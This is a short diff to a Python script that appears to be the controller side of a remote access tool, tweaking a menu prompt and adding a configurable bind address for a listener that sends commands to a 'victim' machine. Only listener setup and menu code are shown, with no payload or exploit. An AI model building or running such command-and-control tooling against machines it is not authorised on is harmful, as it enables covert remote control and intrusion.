@@ -26,7 +26,7 @@ def serverhandler(my_socket):
      print("")
      while True :
         show_options()
-        ch = input("[+] Select Your Options :")
+        ch = input("[+] Select Your Options : ")
         my_socket.send_data(ch)
         if ch == "1" or ch == "01":
             print("[+] Running Commands On Victim")
@@ -153,9 +153,10 @@ def upload_file(my_socket):
 if __name__=='__main__':
     # Create Socket Object
     my_socket = ServerConnection()
+    ip = "127.0.0.1" # Change This
     port = 8080 # Change This
 
-    my_socket.CreateConnection(port)
+    my_socket.CreateConnection(ip,port)
     print(f"[+] Creating Socket And Binding It To Port {port}")
 
     my_socket.Listen(3)# Max Number Of Connections To Listen To Set to 3
